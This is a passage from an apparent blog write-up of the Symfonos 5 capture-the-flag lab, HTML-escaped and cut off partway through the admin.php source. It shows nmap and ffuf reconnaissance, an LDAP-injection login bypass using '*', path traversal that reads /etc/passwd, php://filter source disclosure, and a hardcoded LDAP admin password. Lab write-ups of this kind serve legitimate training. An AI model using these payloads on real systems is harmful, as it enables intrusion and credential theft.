&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Beginner&lt;/td&gt;
&lt;td&gt;2 Mar 2020&lt;/td&gt;
&lt;td&gt;Zayotic&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;In this box, we first perform ldap injection on the web application to bypass the login page. Then we are able to read
local files by abusing a local file inclusion vulnerability with php base64 filter. From one of the php files we get
ldap credentials that we used to authenticate to ldap and dump entries. From the entries we get a base64 encoded
password that we could use to ssh into the machine. For privilege escalation to a root shell we abused sudo permission granted on
dpkg.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.191.132
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.0019s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
80/tcp  open  http     Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;text/html&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;389636-ldap&#34;&gt;389,636 (LDAP)&lt;/h2&gt;
&lt;p&gt;Doing some basic enumeration on ldap without credentials we only get the domain name. We&amp;rsquo;ll probably
get back to it incase we land on some credentials.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;nmap scripts&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nmap -p 389,636 --script ldap-* 192.168.191.132 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-2.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;ldapsearch&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ldapsearch -h 192.168.191.132 -D &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -w &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;80-http&#34;&gt;80 (HTTP)&lt;/h2&gt;
&lt;p&gt;Opening the site on the browser, we only get a plain page with an image.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Performing a directory/file bruteforce using ffuf, we discover new files.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ffuf -ic -c -u http://192.168.191.132/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e /,.php,.html -t &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; | tee root.ffuf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Accessing /home.php we are redirected to admin.php which has a login form.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-5.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I tried out credential bruteforce and sql injection auth bypass techniques but none of them were successful. I
then thought to try out ldap injection. Since we have ldap running on this host it could be a valid path.&lt;/p&gt;
&lt;p&gt;The application performs authentication insecurely by using GET requests to login.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Setting the username and password to &lt;code&gt;*&lt;/code&gt; we successfully login.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We get redirected to home.php which doesn&amp;rsquo;t have much, but clicking on portraits we see interesting functionality.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-8.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The url parameter takes in a url, changing the input to &lt;code&gt;../../../../etc/passwd&lt;/code&gt; we can read the passwd file. This confirms
we can abuse LFI to access other files on disk by directory traversal.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos5/symfonos5-9.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I tried accessing log files to try for RCE like the previous boxes but nothing came up. We can still use this to read
files so we can check the source code of the app.&lt;/p&gt;
&lt;p&gt;Accessing the php files directly just executes them, so we need to use php wrappers.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;home.php&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=home.php
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;session_start&lt;/span&gt;();

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;loggedin&amp;#39;&lt;/span&gt;])){
        &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Location: admin.php&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;]))
{
$r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;];
$result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($r);
}

&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;html&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;head&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;body&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;nav class=&amp;#34;navbar navbar-expand-lg navbar-dark bg-dark&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;a class=&amp;#34;navbar-brand&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;symfonos&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;button class=&amp;#34;navbar-toggler&amp;#34; type=&amp;#34;button&amp;#34; data-toggle=&amp;#34;collapse&amp;#34; data-target=&amp;#34;#navbarColor02&amp;#34; aria-controls=&amp;#34;navbarColor02&amp;#34; aria-expanded=&amp;#34;false&amp;#34; aria-label=&amp;#34;Toggle navigation&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    &amp;lt;span class=&amp;#34;navbar-toggler-icon&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;/button&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;div class=&amp;#34;collapse navbar-collapse&amp;#34; id=&amp;#34;navbarColor02&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    &amp;lt;ul class=&amp;#34;navbar-nav mr-auto&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;        &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php&amp;#34;&amp;gt;Home&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;        &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;home.php?url=http://127.0.0.1/portraits.php&amp;#34;&amp;gt;Portraits&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;li class=&amp;#34;nav-item&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;        &amp;lt;a class=&amp;#34;nav-link&amp;#34; href=&amp;#34;logout.php&amp;#34;&amp;gt;Logout&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;/li&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    &amp;lt;/ul&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/nav&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;center&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;?php
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;if ($result){
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;echo $result;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;} else {
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;echo &amp;#34;&amp;lt;h3&amp;gt;Under Developement&amp;lt;/h3&amp;gt;&amp;#34;;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;} ?&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/center&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;admin.php&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=admin.php
&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;session_start&lt;/span&gt;();

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;loggedin&amp;#34;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;loggedin&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;){
    &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location: home.php&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;authLdap&lt;/span&gt;($username, $password) {
  $ldap_ch &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ldap_connect&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ldap://172.18.0.22&amp;#34;&lt;/span&gt;);

  &lt;span style=&#34;color:#a6e22e&#34;&gt;ldap_set_option&lt;/span&gt;($ldap_ch, &lt;span style=&#34;color:#a6e22e&#34;&gt;LDAP_OPT_PROTOCOL_VERSION&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;);

  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$ldap_ch) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FALSE&lt;/span&gt;;
  }

  $bind &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ldap_bind&lt;/span&gt;($ldap_ch, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cn=admin,dc=symfonos,dc=local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;qMDdyZh3cT6eeAWD&amp;#34;&lt;/span&gt;);

  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$bind) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FALSE&lt;/span&gt;;
  }

  $filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(&amp;amp;(uid=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$username&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)(userPassword=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$password&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;))&amp;#34;&lt;/span&gt;;
  $result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ldap_search&lt;/span&gt;($ldap_ch, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dc=symfonos,dc=local&amp;#34;&lt;/span&gt;, $filter);

  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;$result) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FALSE&lt;/span&gt;;
  }

  $info &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ldap_get_entries&lt;/span&gt;($ldap_ch, $result);

  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;($info) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; ($info[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;count&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FALSE&lt;/span&gt;;
  }

  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;TRUE&lt;/span&gt;;

}

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;])){

$username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;urldecode&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;]);
$password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;urldecode&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;]);

$bIsAuth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;authLdap&lt;/span&gt;($username, $password);

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt; $bIsAuth ) {
        $msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid login&amp;#34;&lt;/span&gt;;
} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
        $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;loggedin&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location: home.php&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;;
}
}
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;html&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;head&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;body&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  &amp;lt;div class=&amp;#34;row justify-content-center&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;    &amp;lt;div class=&amp;#34;col-md-8&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      &amp;lt;div class=&amp;#34;card&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;        &amp;lt;div class=&amp;#34;card-header&amp;#34;&amp;gt;Login&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;        &amp;lt;div class=&amp;#34;card-body&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          &amp;lt;form action=&amp;#34;admin.php&amp;#34; method=&amp;#34;GET&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;            &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;label for=&amp;#34;email_address&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                    &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;username&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;username&amp;#34; required autofocus&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;            &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;            &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;label for=&amp;#34;password&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                    &amp;lt;input type=&amp;#34;password&amp;#34; id=&amp;#34;password&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;password&amp;#34; required&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;            &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;            &amp;lt;div class=&amp;#34;col-md-6 offset-md-4&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;btn btn-primary&amp;#34;&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                    Login
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;                &amp;lt;/button&amp;gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;            &amp;lt;/div&amp;gt;
